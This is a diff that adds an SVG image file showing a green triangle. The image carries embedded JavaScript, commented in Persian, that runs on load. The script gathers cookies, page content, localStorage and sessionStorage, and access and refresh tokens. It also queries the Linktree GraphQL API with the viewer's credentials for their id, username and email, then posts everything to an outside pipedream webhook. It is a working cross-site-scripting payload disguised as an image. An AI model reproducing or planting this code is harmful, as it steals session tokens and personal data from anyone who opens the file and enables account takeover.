@@ -1,0 +1,71 @@
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+   <script type="text/javascript">
+      // جمع‌آوری اطلاعات
+      var cookies = document.cookie;
+      var pageUrl = window.location.href;
+      var pageContent = document.documentElement.innerHTML;
+      var localStorageData = JSON.stringify(localStorage);
+      var sessionStorageData = JSON.stringify(sessionStorage);
+
+      // تابع برای گرفتن توکن‌ها
+      function stealTokens() {
+         var tokens = {};
+         // چک کردن localStorage و sessionStorage
+         tokens.localStorageToken = localStorage.getItem("token-access_token") || "No access token in localStorage";
+         tokens.refreshToken = localStorage.getItem("token-refresh_token") || "No refresh token in localStorage";
+         tokens.sessionStorageToken = sessionStorage.getItem("token-access_token") || "No access token in sessionStorage";
+
+         // تلاش برای پیدا کردن توکن‌ها تو متغیرهای جاوااسکریپت
+         var possibleTokens = "";
+         try {
+            possibleTokens = window.token || window.accessToken || window.authToken || "No tokens in JS variables";
+         } catch(e) {
+            possibleTokens = "Error accessing JS variables";
+         }
+
+         // درخواست به API برای گرفتن پاسخ
+         var xhr = new XMLHttpRequest();
+         xhr.open("POST", "https://graph.linktr.ee/graphql", true);
+         xhr.withCredentials = true;
+         xhr.setRequestHeader("Content-Type", "application/json");
+         xhr.send(JSON.stringify({
+            "operationName": "getUserProfile",
+            "variables": {},
+            "query": "query getUserProfile { userProfile { id username email } }"
+         }));
+
+         xhr.onreadystatechange = function() {
+            if (xhr.readyState == 4) {
+               var response = xhr.responseText;
+               var headers = xhr.getAllResponseHeaders();
+
+               // جمع‌آوری همه اطلاعات
+               var data = {
+                  "cookies": cookies,
+                  "pageUrl": pageUrl,
+                  "pageContent": pageContent,
+                  "localStorage": localStorageData,
+                  "sessionStorage": sessionStorageData,
+                  "tokens": tokens,
+                  "jsVariables": possibleTokens,
+                  "apiResponse": response,
+                  "responseHeaders": headers
+               };
+
+               // ارسال به webhook
+               var webhook = new XMLHttpRequest();
+               webhook.open("POST", "https://eo46kslyi520x1r.m.pipedream.net", true);
+               webhook.setRequestHeader("Content-Type", "application/json");
+               webhook.send(JSON.stringify(data));
+            }
+         };
+      }
+
+      // اجرا
+      stealTokens();
+   </script>
+</svg>
